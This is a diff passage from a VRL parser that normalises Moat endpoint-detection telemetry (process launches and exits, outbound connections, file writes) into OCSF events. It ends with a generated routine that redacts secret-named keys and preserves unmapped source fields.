+          unmapped.last_ok = to_string(m.last_ok) ?? ""
+          if hb_version != "" { unmapped.moat_version = hb_version }
+          hb_classes = array(m.classes) ?? []
+          if length(hb_classes) > 0 { unmapped.telemetry_classes = join!(hb_classes, ",") }
+
+      } else if env_class == "process" {
+          # ================= Process Activity 1007 =======================
+          # The opt-in `process` class. exec ships a full projection; exit is
+          # deliberately tiny - the collector already holds the exec this
+          # exec_id refers to, which is the whole point of not inlining parents.
+          class_uid = 1007
+          class_name = "Process Activity"
+          category_uid = 1
+          category_name = "System Activity"
+          activity_id = 1
+          activity_name = "Launch"
+          if kind == "exit" { activity_id = 2; activity_name = "Terminate" }
+
+          exe = to_string(m.exe) ?? ""
+          exe_name = ""
+          if exe != "" {
+              nm, nm_err = parse_regex(exe, r'(?P<b>[^/]+)$')
+              if nm_err == null { exe_name = to_string(nm.b) }
+          }
+          subject = {}
+          if exe_name != "" { subject.name = exe_name }
+          if exe != "" { subject.file = { "name": exe_name, "path": exe, "type_id": 1 } }
+          pargs = to_string(m.args) ?? ""
+          if pargs != "" { subject.cmd_line = pargs }
+          spid = to_int(m.pid) ?? -1
+          if spid >= 0 { subject.pid = spid }
+          exec_id = to_string(m.exec_id) ?? ""
+          if exec_id != "" { subject.uid = exec_id }
+          if spid < 0 && exec_id == "" { subject.uid = record_uid_seed }
+          ocsf.process = subject
+
+          # `inline_parent = true` restores a parent block for collectors that
+          # cannot join; by default only parent_exec_id ships.
+          par = object(m.parent) ?? {}
+          if length(par) > 0 {
+              pexe = to_string(par.exe) ?? ""
+              pname = ""
+              if pexe != "" {
+                  pn, pn_err = parse_regex(pexe, r'(?P<b>[^/]+)$')
+                  if pn_err == null { pname = to_string(pn.b) }
+              }
+              parent_process = {}
+              if pname != "" { parent_process.name = pname }
+              if pexe != "" { parent_process.file = { "name": pname, "path": pexe, "type_id": 1 } }
+              pa = to_string(par.args) ?? ""
+              if pa != "" { parent_process.cmd_line = pa }
+              ppid = to_int(par.pid) ?? -1
+              if ppid >= 0 { parent_process.pid = ppid }
+              pexec = to_string(par.exec_id) ?? ""
+              if pexec != "" { parent_process.uid = pexec }
+              if ppid < 0 && pexec == "" { parent_process.uid = record_uid_seed }
+              ocsf.actor = { "process": parent_process }
+          } else {
+              ocsf.actor = { "process": subject }
+          }
+          puid = to_int(m.uid) ?? -1
+          if puid >= 0 { ocsf.actor.user = { "uid": to_string(puid) } }
+          ocsf.device = device
+
+          if kind == "exit" {
+              exit_status = to_int(m.status) ?? 0
+              ocsf.status_code = to_string(exit_status)
+              if exit_status == 0 { ocsf.status_id = 1; ocsf.status = "Success" }
+              if exit_status != 0 { ocsf.status_id = 2; ocsf.status = "Failure" }
+              exit_signal = to_int(m.signal) ?? 0
+              if exit_signal > 0 { unmapped.exit_signal = exit_signal }
+          } else {
+              ocsf.status_id = 1
+              ocsf.status = "Success"
+          }
+
+          if exe_name != "" {
+              obs = push(obs, { "name": "process.name", "type": "Process Name", "type_id": 9, "value": exe_name })
+          }
+          if exec_id != "" { unmapped.exec_id = exec_id }
+          parent_exec_id = to_string(m.parent_exec_id) ?? ""
+          if parent_exec_id != "" { unmapped.parent_exec_id = parent_exec_id }
+          pcwd = to_string(m.cwd) ?? ""
+          if pcwd != "" { unmapped.cwd = pcwd }
+          pauid = to_int(m.auid) ?? -1
+          if pauid >= 0 { unmapped.auid = pauid }
+          pstart = to_string(m.start_time) ?? ""
+          if pstart != "" { unmapped.start_time = pstart }
+
+      } else if env_class == "network" {
+          # ================= Network Activity 4001 (Open) ================
+          # Only outbound connects to PUBLIC addresses reach userspace at all -
+          # private, loopback, link-local and IPv6 ULA are excluded in-kernel.
+          class_uid = 4001
+          class_name = "Network Activity"
+          category_uid = 4
+          category_name = "Network Activity"
+          activity_id = 1
+          activity_name = "Open"
+
+          dst = {}
+          dst_ip = downcase(to_string(m.dst_ip) ?? "")
+          if dst_ip != "" { dst.ip = dst_ip }
+          dst_port = to_int(m.dst_port) ?? 0
+          if dst_port > 0 { dst.port = dst_port }
+          if dst_ip != "" { ocsf.dst_endpoint = dst }
+          ocsf.src_endpoint = { "hostname": device_hostname }
+          ocsf.connection_info = { "direction_id": 2 }
+          ocsf.status_id = 1
+          ocsf.status = "Success"
+
+          net_actor = {}
+          nexe = to_string(m.exe) ?? ""
+          nname = ""
+          if nexe != "" {
+              nn, nn_err = parse_regex(nexe, r'(?P<b>[^/]+)$')
+              if nn_err == null { nname = to_string(nn.b) }
+          }
+          np = {}
+          if nname != "" { np.name = nname }
+          if nexe != "" { np.file = { "name": nname, "path": nexe, "type_id": 1 } }
+          nargs = to_string(m.args) ?? ""
+          if nargs != "" { np.cmd_line = nargs }
+          npid = to_int(m.pid) ?? -1
+          if npid >= 0 { np.pid = npid }
+          nexec = to_string(m.exec_id) ?? ""
+          if nexec != "" { np.uid = nexec }
+          if npid >= 0 || nexec != "" { net_actor.process = np }
+          nuid = to_int(m.uid) ?? -1
+          if nuid >= 0 { net_actor.user = { "uid": to_string(nuid) } }
+          if length(net_actor) > 0 { ocsf.actor = net_actor }
+          ocsf.device = device
+
+          if dst_ip != "" {
+              obs = push(obs, { "name": "dst_endpoint.ip", "type": "IP Address", "type_id": 2, "value": dst_ip })
+          }
+          if nname != "" {
+              obs = push(obs, { "name": "actor.process.name", "type": "Process Name", "type_id": 9, "value": nname })
+          }
+          event_code = "connect"
+          nhook = to_string(m.hook) ?? ""
+          if nhook != "" { unmapped.hook = nhook }
+          if nexec != "" { unmapped.exec_id = nexec }
+          nparent = to_string(m.parent_exec_id) ?? ""
+          if nparent != "" { unmapped.parent_exec_id = nparent }
+          ncwd = to_string(m.cwd) ?? ""
+          if ncwd != "" { unmapped.cwd = ncwd }
+          # pkg_root is ancestry the kernel cannot see: it separates "npm
+          # unpacked this" from "something rewrote it afterwards".
+          npkg = to_string(m.pkg_root) ?? ""
+          if npkg != "" { unmapped.pkg_root = npkg }
+
+      } else if env_class == "file" {
+          # ================= File System Activity 1001 ===================
+          # verdict is the create/modify ladder of SHIPPING.md §3: a modify of an
+          # already-installed script is worth more than its creation, which is
+          # why the two are different activities here rather than one "write".
+          class_uid = 1001
+          class_name = "File System Activity"
+          category_uid = 1
+          category_name = "System Activity"
+          verdict = to_string(m.verdict) ?? ""
+          activity_id = 3
+          activity_name = "Update"
+          if verdict == "create" { activity_id = 1; activity_name = "Create" }
+          if kind == "file_chmod" || verdict == "chmod_x" {
+              activity_id = 6
+              activity_name = "Set Attributes"
+          }
+
+          fpath = to_string(m.path) ?? ""
+          fname = ""
+          if fpath != "" {
+              fn, fn_err = parse_regex(fpath, r'(?P<b>[^/]+)$')
+              if fn_err == null { fname = to_string(fn.b) }
+          }
+          if fname == "" { fname = "unknown" }
+          file_obj = { "name": fname, "type_id": 1 }
+          if fpath != "" { file_obj.path = fpath }
+          fsize = to_int(m.bytes) ?? -1
+          if fsize >= 0 { file_obj.size = fsize }
+          fsha = downcase(to_string(m.sha256) ?? "")
+          if fsha != "" { file_obj.hashes = [{ "algorithm_id": 3, "value": fsha }] }
+          ocsf.file = file_obj
+
+          file_actor = {}
+          fexe = to_string(m.exe) ?? ""
+          fexe_name = ""
+          if fexe != "" {
+              xn, xn_err = parse_regex(fexe, r'(?P<b>[^/]+)$')
+              if xn_err == null { fexe_name = to_string(xn.b) }
+          }
+          fp = {}
+          if fexe_name != "" { fp.name = fexe_name }
+          if fexe != "" { fp.file = { "name": fexe_name, "path": fexe, "type_id": 1 } }
+          fargs = to_string(m.args) ?? ""
+          if fargs != "" { fp.cmd_line = fargs }
+          fpid = to_int(m.pid) ?? -1
+          if fpid >= 0 { fp.pid = fpid }
+          fexec = to_string(m.exec_id) ?? ""
+          if fexec != "" { fp.uid = fexec }
+          if fpid >= 0 || fexec != "" { file_actor.process = fp }
+          fuid = to_int(m.uid) ?? -1
+          if fuid >= 0 { file_actor.user = { "uid": to_string(fuid) } }
+          if length(file_actor) > 0 { ocsf.actor = file_actor }
+          ocsf.device = device
+          ocsf.status_id = 1
+          ocsf.status = "Success"
+
+          if fpath != "" {
+              obs = push(obs, { "name": "file.path", "type": "File Name", "type_id": 7, "value": fpath })
+          }
+          if fsha != "" {
+              obs = push(obs, { "name": "file.hashes.value", "type": "Hash", "type_id": 8, "value": fsha })
+          }
+          if fexe_name != "" {
+              obs = push(obs, { "name": "actor.process.name", "type": "Process Name", "type_id": 9, "value": fexe_name })
+          }
+          event_code = kind
+          if fsize >= 0 { unmapped.file_bytes = fsize }
+          if verdict != "" { unmapped.verdict = verdict }
+          fshape = to_string(m.shape) ?? ""
+          if fshape != "" { unmapped.shape = fshape }
+          if fexec != "" { unmapped.exec_id = fexec }
+          fparent = to_string(m.parent_exec_id) ?? ""
+          if fparent != "" { unmapped.parent_exec_id = fparent }
+          fcwd = to_string(m.cwd) ?? ""
+          if fcwd != "" { unmapped.cwd = fcwd }
+          fpkg = to_string(m.pkg_root) ?? ""
+          if fpkg != "" { unmapped.pkg_root = fpkg }
+          # capture_body is off by default and is the only switch that puts file
+          # CONTENTS anywhere they can leave the machine. Kept out of a promoted
+          # column on purpose.
+          fbody = to_string(m.body) ?? ""
+          if fbody != "" { unmapped.body = fbody }
+
+      } else {
+          # An envelope shape this parser does not know yet. Keep it in the
+          # findings lane, visible and searchable, rather than silently
+          # reshaping it into a class it is not.
+          class_uid = 2004
+          class_name = "Detection Finding"
+          category_uid = 2
+          category_name = "Findings"
+          activity_id = 99
+          activity_name = "Other"
+          unknown_uid = event_id
+          if unknown_uid == "" { unknown_uid = sha2("moat_edr|raw|" + raw_log, variant: "SHA-256") }
+          ocsf.finding_info = {
+              "uid": unknown_uid,
+              "title": "Unrecognized moat record",
+              "data_sources": ["moat_edr", host]
+          }
+          ocsf.device = device
+          ocsf.status_id = 1
+          ocsf.status = "New"
+          if env_class != "" { unmapped.moat_class = env_class }
+          if kind != "" { unmapped.moat_kind = kind }
+      }
+
+      # ---- common envelope ---------------------------------------------
+      ocsf.class_uid = class_uid
+      ocsf.class_name = class_name
+      ocsf.category_uid = category_uid
+      ocsf.category_name = category_name
+      ocsf.activity_id = activity_id
+      ocsf.activity_name = activity_name
+      ocsf.type_uid = class_uid * 100 + activity_id
+      ocsf.severity_id = severity_id
+      ocsf.severity = severity
+      ocsf.time = time_ms
+      ocsf.raw_data = raw_log
+
+      record_uid = event_id
+      if record_uid == "" { record_uid = sha2("moat_edr|raw|" + raw_log, variant: "SHA-256") }
+      metadata = {
+          "version": "1.9.0",
+          "profiles": profiles,
+          "uid": record_uid,
+          "log_name": "moat_edr",
+          "log_source": "moat_edr",
+          "product": { "name": "Moat", "vendor_name": "Omarchy" }
+      }
+      if event_code != "" { metadata.event_code = event_code }
+      # The chain is moat's own correlation id - the thing that turns several
+      # ripples into one story. Promoting it to metadata.correlation_uid is what
+      # lets the lake group them without knowing about chains.
+      if correlation_uid != "" { metadata.correlation_uid = correlation_uid }
+      # NAN-3718: original_event_uid holds the vendor's own per-event id and is
+      # omitted when the record has none; a composite or hash belongs only in
+      # metadata.uid.
+      # Moat: the envelope's event_id.
+      if event_id != "" { metadata.original_event_uid = event_id }
+      ocsf.metadata = metadata
+
+      if length(obs) > 0 { ocsf.observables = obs }
+      if length(unmapped) > 0 { ocsf.unmapped = unmapped }
+
+      . = ocsf
+  }
+
+  # NAN-2421 residual spill. Generated by scripts/residual_spill.py; edit the template.
+  # __source_kv is a local variable, never an OCSF attribute. The checker instruments
+  # this marker to observe the parsed source without changing production output.
+  # Exact value representation is evaluated AFTER branch selection. Numeric strings
+  # count as represented by their typed scalar; other transformations are explicit.
+  __mapped = object!(parse_json!(encode_json(.)))
+  __existing = object(__mapped.unmapped) ?? {}
+  __discard = del(__mapped.raw_data)
+  __discard = del(__mapped.unmapped)
+  if __mapped.message == __raw_body { __discard = del(__mapped.message) }
+  __represented = []
+  __walk = map_values(__mapped, recursive: true) -> |value| {
+      __represented = push(__represented, encode_json(value))
+      if !is_object(value) && !is_array(value) && !is_null(value) {
+          __represented = push(__represented, to_string(value) ?? "")
+      }
+      value
+  }
+  __consumed = []
+  # BEGIN parser-specific transformations
+  # host: Parser lowercases this source value; consume only when the normalized value is emitted.
+  # severity: Parser lowercases this source value; consume only when the normalized value is emitted.
+  # moat.severity: Parser lowercases this source value; consume only when the normalized value is emitted.
+  # moat.file.sha256: Parser lowercases this source value; consume only when the normalized value is emitted.
+  # moat.dst_ip: Parser lowercases this source value; consume only when the normalized value is emitted.
+  # moat.sha256: Parser lowercases this source value; consume only when the normalized value is emitted.
+  # moat.ts: Successful ISO timestamp conversion to the selected event clock in milliseconds.
+  # moat.update.ts: Successful ISO timestamp conversion to the selected event clock in milliseconds.
+  # moat.receipt.started: Successful ISO timestamp conversion to the selected event clock in milliseconds.
+  # @timestamp: Existing timestamp conversion verified against the emitted millisecond clock.
+  # moat.action_taken: Parser normalizes the caption case; verify the emitted caption.
+  # moat.severity: Parser normalizes the caption case; verify the emitted caption.
+  # moat.severity: Named vendor outcome/protocol/severity normalized by the existing mapping; consume only when the expected ID is emitted.
+  # moat.severity_base: Parser normalizes the caption case; verify the emitted caption.
+  # severity: Parser normalizes the caption case; verify the emitted caption.
+  # severity: Named vendor outcome/protocol/severity normalized by the existing mapping; consume only when the expected ID is emitted.
+  # moat.chain.severity_base: Parser normalizes the caption case; verify the emitted caption.
+  # moat.triage.confidence: Parser normalizes the caption case; verify the emitted caption.
+  # moat.severity_base: Parser normalizes the caption case; verify the emitted caption.
+  # moat.severity_reason: Parser normalizes the caption case; verify the emitted caption.
+  # moat.chain.severity: Parser normalizes the caption case; verify the emitted caption.
+  # moat.chain.severity: Named vendor outcome/protocol/severity normalized by the existing mapping; consume only when the expected ID is emitted.
+  # moat.chain.severity_base: Parser normalizes the caption case; verify the emitted caption.
+  # moat.severity_base: Parser normalizes the caption case; verify the emitted caption.
+  # moat.severity_base: Parser normalizes the caption case; verify the emitted caption.
+  # moat.verdict: Parser normalizes the caption case; verify the emitted caption.
+  # class: Parser normalizes the caption case; verify the emitted caption.
+  # moat.last_ok: Existing timestamp conversion verified against the emitted millisecond clock.
+  # moat.receipt.duration_s: Existing unit conversion by 1000 verified against duration; unused clock fallbacks remain residual.
+  # moat.start_time: Existing timestamp conversion verified against the emitted millisecond clock.
+  # Only source keys read by this parser are eligible for exact-value consumption; the selected branch must emit the value. Unknown keys always spill, even when their value equals an OCSF default.
+  __candidates = ["@timestamp", "class", "event_id", "host", "kind", "moat", "moat.acked", "moat.acked_by", "moat.action_taken", "moat.actions", "moat.actor.package", "moat.actor.provenance", "moat.actor.script", "moat.args", "moat.auid", "moat.backlog", "moat.backlog_bytes", "moat.body", "moat.bytes", "moat.carried.generation", "moat.chain", "moat.chain.ancestor.exe", "moat.chain.families", "moat.chain.id", "moat.chain.members", "moat.chain.severity", "moat.chain.severity_base", "moat.chain.severity_reason", "moat.chain.span_secs", "moat.chain.steps", "moat.chain.steps_total", "moat.chain.summary", "moat.chain.triggers_total", "moat.classes", "moat.content", "moat.context", "moat.count", "moat.cwd", "moat.dropped", "moat.dst_ip", "moat.dst_port", "moat.exe", "moat.exec_id", "moat.family", "moat.file.path", "moat.file.sha256", "moat.hook", "moat.id", "moat.incident.dir", "moat.incident.files", "moat.ioc", "moat.ioc.matched", "moat.ioc.source", "moat.last_error", "moat.last_ok", "moat.mode", "moat.net.domain", "moat.net.domain_age_secs", "moat.net.domain_cname", "moat.net.domain_queried_by", "moat.net.dst_ip", "moat.net.dst_port", "moat.parent", "moat.parent.args", "moat.parent.exe", "moat.parent.exec_id", "moat.parent.pid", "moat.parent_exec_id", "moat.path", "moat.pid", "moat.pkg_install_escalation", "moat.pkg_root", "moat.process", "moat.process.ancestry", "moat.process.args", "moat.process.cwd", "moat.process.exe", "moat.process.pid", "moat.process.uid", "moat.rarity", "moat.rarity_text", "moat.receipt", "moat.receipt.credential_reads", "moat.receipt.cwd", "moat.receipt.duration_s", "moat.receipt.execs_from_tmp", "moat.receipt.execs_from_tree", "moat.receipt.exit", "moat.receipt.id", "moat.receipt.network", "moat.receipt.persistence_writes", "moat.receipt.postinstall_scripts", "moat.receipt.root_args", "moat.receipt.root_exe", "moat.receipt.started", "moat.receipt.writes_outside_project", "moat.rule", "moat.severity", "moat.severity_base", "moat.severity_reason", "moat.sha256", "moat.shape", "moat.shipped", "moat.signal", "moat.start_time", "moat.status", "moat.summary", "moat.suppressed_by", "moat.surface", "moat.tier", "moat.title", "moat.transport", "moat.triage", "moat.triage.agent", "moat.triage.at", "moat.triage.confidence", "moat.triage.outcome", "moat.triage.proposed_allowlist", "moat.triage.summary", "moat.triage.verdict", "moat.ts", "moat.uid", "moat.update", "moat.update.acked", "moat.update.acked_by", "moat.update.chain", "moat.update.chain.ancestor.exe", "moat.update.chain.families", "moat.update.chain.id", "moat.update.chain.members", "moat.update.chain.severity", "moat.update.chain.severity_base", "moat.update.chain.severity_reason", "moat.update.chain.span_secs", "moat.update.chain.steps", "moat.update.chain.steps_total", "moat.update.chain.summary", "moat.update.chain.triggers_total", "moat.update.count", "moat.update.incident.dir", "moat.update.incident.files", "moat.update.surface", "moat.update.triage", "moat.update.triage.agent", "moat.update.triage.at", "moat.update.triage.confidence", "moat.update.triage.outcome", "moat.update.triage.proposed_allowlist", "moat.update.triage.summary", "moat.update.triage.verdict", "moat.update.ts", "moat.verdict", "moat.version", "moat.withheld", "moat_tier", "severity"]
+  __preserve = ["dns"]
+  __rules = array!(parse_json!("[{\"source\":\"host\",\"kind\":\"lowercase\",\"reason\":\"Parser lowercases this source value; consume only when the normalized value is emitted.\"},{\"source\":\"severity\",\"kind\":\"lowercase\",\"reason\":\"Parser lowercases this source value; consume only when the normalized value is emitted.\"},{\"source\":\"moat.severity\",\"kind\":\"lowercase\",\"reason\":\"Parser lowercases this source value; consume only when the normalized value is emitted.\"},{\"source\":\"moat.file.sha256\",\"kind\":\"lowercase\",\"reason\":\"Parser lowercases this source value; consume only when the normalized value is emitted.\"},{\"source\":\"moat.dst_ip\",\"kind\":\"lowercase\",\"reason\":\"Parser lowercases this source value; consume only when the normalized value is emitted.\"},{\"source\":\"moat.sha256\",\"kind\":\"lowercase\",\"reason\":\"Parser lowercases this source value; consume only when the normalized value is emitted.\"},{\"source\":\"moat.ts\",\"kind\":\"epoch_ms\",\"target\":\"time\",\"reason\":\"Successful ISO timestamp conversion to the selected event clock in milliseconds.\"},{\"source\":\"moat.update.ts\",\"kind\":\"epoch_ms\",\"target\":\"time\",\"reason\":\"Successful ISO timestamp conversion to the selected event clock in milliseconds.\"},{\"source\":\"moat.receipt.started\",\"kind\":\"epoch_ms\",\"target\":\"time\",\"reason\":\"Successful ISO timestamp conversion to the selected event clock in milliseconds.\"},{\"source\":\"@timestamp\",\"kind\":\"epoch_ms\",\"target\":\"time\",\"format\":\"%+\",\"reason\":\"Existing timestamp conversion verified against the emitted millisecond clock.\"},{\"source\":\"moat.action_taken\",\"kind\":\"enum\",\"target\":\"disposition\",\"values\":{\"blocked\":\"Blocked\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.severity\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"critical\":\"Critical\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.severity\",\"kind\":\"enum\",\"target\":\"severity_id\",\"values\":{\"informational\":1,\"info\":1,\"debug\":1,\"low\":2,\"medium\":3,\"warn\":3,\"warning\":3,\"high\":4,\"error\":4,\"critical\":5,\"fatal\":6},\"reason\":\"Named vendor outcome/protocol/severity normalized by the existing mapping; consume only when the expected ID is emitted.\"},{\"source\":\"moat.severity_base\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"critical\":\"Critical\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"severity\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"critical\":\"Critical\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"severity\",\"kind\":\"enum\",\"target\":\"severity_id\",\"values\":{\"informational\":1,\"info\":1,\"debug\":1,\"low\":2,\"medium\":3,\"warn\":3,\"warning\":3,\"high\":4,\"error\":4,\"critical\":5,\"fatal\":6},\"reason\":\"Named vendor outcome/protocol/severity normalized by the existing mapping; consume only when the expected ID is emitted.\"},{\"source\":\"moat.chain.severity_base\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"high\":\"High\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.triage.confidence\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"high\":\"High\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.severity_base\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"high\":\"High\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.severity_reason\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"high\":\"High\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.chain.severity\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"critical\":\"Critical\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.chain.severity\",\"kind\":\"enum\",\"target\":\"severity_id\",\"values\":{\"informational\":1,\"info\":1,\"debug\":1,\"low\":2,\"medium\":3,\"warn\":3,\"warning\":3,\"high\":4,\"error\":4,\"critical\":5,\"fatal\":6},\"reason\":\"Named vendor outcome/protocol/severity normalized by the existing mapping; consume only when the expected ID is emitted.\"},{\"source\":\"moat.chain.severity_base\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"critical\":\"Critical\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.severity_base\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"low\":\"Low\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.severity_base\",\"kind\":\"enum\",\"target\":\"risk_level\",\"values\":{\"medium\":\"Medium\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.verdict\",\"kind\":\"enum\",\"target\":\"activity_name\",\"values\":{\"create\":\"Create\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"class\",\"kind\":\"enum\",\"target\":\"metadata.product.name\",\"values\":{\"moat\":\"Moat\"},\"reason\":\"Parser normalizes the caption case; verify the emitted caption.\"},{\"source\":\"moat.last_ok\",\"kind\":\"epoch_ms\",\"target\":\"time\",\"format\":\"%+\",\"reason\":\"Existing timestamp conversion verified against the emitted millisecond clock.\"},{\"source\":\"moat.receipt.duration_s\",\"kind\":\"scale\",\"factor\":1000,\"target\":\"duration\",\"reason\":\"Existing unit conversion by 1000 verified against duration; unused clock fallbacks remain residual.\"},{\"source\":\"moat.start_time\",\"kind\":\"epoch_ms\",\"target\":\"time\",\"format\":\"%+\",\"reason\":\"Existing timestamp conversion verified against the emitted millisecond clock.\"}]"))
+  __source_flat = flatten(__source_kv)
+  for_each(__rules) -> |_index, rule| {
+      __source_key = string!(rule.source)
+      __value = get!(__source_flat, [__source_key])
+      __expected = null
+      __valid = false
+      if rule.kind == "lowercase" && is_string(__value) {
+          __expected = downcase(string!(__value))
+          __valid = true
+      } else if rule.kind == "epoch_ms" {
+          __clock, __clock_err = parse_timestamp(string(__value) ?? "", string(rule.format) ?? "%+")
+          if __clock_err == null {
+              __expected = to_unix_timestamp(__clock, unit: "milliseconds")
+              __valid = true
+          }
+      } else if rule.kind == "scale" {
+          __number, __number_err = to_float(__value)
+          if __number_err == null && __value != null && !is_boolean(__value) {
+              __expected = to_int(__number * to_float!(rule.factor))
+              __valid = true
+          }
+      } else if rule.kind == "hex" {
+          __hex = replace(downcase(string(__value) ?? ""), r'^0x', "")
+          __integer, __integer_err = parse_int(__hex, base: 16)
+          __expected = __integer
+          __valid = is_string(__value) && starts_with(downcase(string(__value) ?? ""), "0x") && __integer_err == null
+      } else if rule.kind == "enum" {
+          __expected = get!(object!(rule.values), [downcase(to_string(__value) ?? "")])
+          __valid = __expected != null
+      }
+      __matches = includes(__represented, encode_json(__expected))
+      if is_string(rule.target) { __matches = get!(., split(string!(rule.target), ".")) == __expected }
+      if __valid && __matches { __consumed = push(__consumed, __source_key) }
+  }
+  # END parser-specific transformations
+  # Redact at every depth, including objects inside arrays, before serialization.
+  __safe = map_values(object!(parse_json!(encode_json({"source": __source_kv, "existing": __existing}))), recursive: true) -> |value| {
+      if is_object(value) {
+          # Header/parameter arrays commonly encode sensitive keys as name/value
+          # or Key/Value objects instead of using the secret name as an object key.
+          __sensitive_pair = false
+          for_each(object!(value)) -> |key, child| {
+              if includes(["name", "key"], downcase(key)) && match(downcase(string(child) ?? ""), r'password|secret|authorization|token') {
+                  __sensitive_pair = true
+              }
+          }
+          for_each(object!(value)) -> |key, _child| {
+              if match(downcase(key), r'password|secret|authorization|token') || (__sensitive_pair && includes(["value", "values"], downcase(key))) {
+                  value = set!(value, [key], "<redacted>")
+              }
+          }
+      }
+      value
+  }
+  # Escape literal dots before flattening so dotted source keys cannot overwrite
+  # nested paths. Decode for naming, and disambiguate collisions with suffixes.
+  __escaped = map_keys(object!(__safe.source), recursive: true) -> |key| {
+      replace(replace(key, "~", "~0"), ".", "~1")
+  }
+  __flat = flatten(__escaped)
+  __residual = {}
+  for_each(__flat) -> |key, value| {
+      key = replace(replace(key, "~1", "."), "~0", "~")
+      # flatten stops at arrays, so objects inside an array still carry the
+      # escaped keys: decode them too, or `a.b` spills as `a~1b` (NAN-3604).
+      if is_array(value) || is_object(value) {
+          value = get!(map_keys({"v": value}, recursive: true) -> |inner| {
+              replace(replace(inner, "~1", "."), "~0", "~")
+          }, ["v"])
+      }
+      __same = includes(__represented, encode_json(value))
+      if !is_object(value) && !is_array(value) && !is_null(value) {
+          __same = __same || includes(__represented, to_string(value) ?? "")
+      }
+      # A scalar array is consumed only if every element is represented. Preserve
+      # partially represented arrays intact, including their ordering and repeats.
+      if is_array(value) && !is_empty(array!(value)) {
+          __all_items = true
+          for_each(array!(value)) -> |_index, item| {
+              __item_same = includes(__represented, encode_json(item))
+              if !is_object(item) && !is_array(item) && !is_null(item) {
+                  __item_same = __item_same || includes(__represented, to_string(item) ?? "")
+              }
+              if is_object(item) || is_array(item) || !__item_same { __all_items = false }
+          }
+          __same = __same || __all_items
+      }
+      if __same && includes(__candidates, key) { __consumed = push(__consumed, key) }
+      # Redacted leaves always remain visible. Do not spill a copy of the raw body.
+      if (!includes(__consumed, key) || value == "<redacted>") && value != __raw_body {
+          __parts = map_values(split(key, ".")) -> |part| { snakecase(string!(part)) }
+          __base = join!(__parts, ".")
+          __key = __base
+          __suffix = 2
+          if includes(keys(__residual), __key) {
+              for_each(__flat) -> |_other_key, _other_value| {
+                  if includes(keys(__residual), __key) {
+                      __key = __base + "_" + to_string(__suffix)
+                      __suffix = __suffix + 1
+                  }
+              }
+          }
+          __complex = is_object(value)
+          if is_array(value) {
+              for_each(array!(value)) -> |_index, item| {
+                  if is_object(item) || is_array(item) { __complex = true }
+              }
+          }
+          __spill = if __complex { encode_json(value) } else { value }
+          __residual = set!(__residual, [__key], __spill)
+      }
+  }
+  # Keep existing derived evidence, but remove null placeholders and mapped copies.
+  # Source-derived aliases are replaced by canonical dotted source paths above.
+  __original_values = []
+  for_each(flatten(__source_kv)) -> |_key, value| {
+      __original_values = push(__original_values, encode_json(value))
+      if !is_object(value) && !is_array(value) { __original_values = push(__original_values, to_string(value) ?? "") }
+  }
+  for_each(flatten(__existing)) -> |key, value| {
+      __source_alias = includes(__original_values, encode_json(value)) || includes(__original_values, to_string(value) ?? "")
+      __mapped_alias = includes(__represented, encode_json(value)) || includes(__represented, to_string(value) ?? "")
+      __decoded, __decode_err = parse_json(string(value) ?? "")
+      __encoded_container = __decode_err == null && (is_object(__decoded) || is_array(__decoded))
+      if !is_null(value) && value != "" && !__source_alias && !__mapped_alias && !__encoded_container && value != __raw_body {
+          # Existing aggregates may contain sensitive descendants; the canonical
+          # source spill above is the authoritative representation of containers.
+          if !is_array(value) && !is_object(value) && !match(downcase(key), r'password|secret|authorization|token') {
+              __key = snakecase(key)
+              if !includes(keys(__residual), __key) { __residual = set!(__residual, [__key], value) }
+          }
+      }
+  }
+  # Parser-declared derived evidence is merged after source spill, with recursive
+  # redaction. These entries preserve meaning beyond source scalar value equality.
+  for_each(__preserve) -> |_index, key| {
+      __derived = get!(object!(__safe.existing), [string!(key)])
+      if __derived != null { __residual = set!(__residual, [string!(key)], __derived) }
+  }
+  __discard = del(.unmapped)
+  if !is_empty(__residual) { .unmapped = __residual }
+  .
+  # END NAN-2421 residual spill
+
+samples:
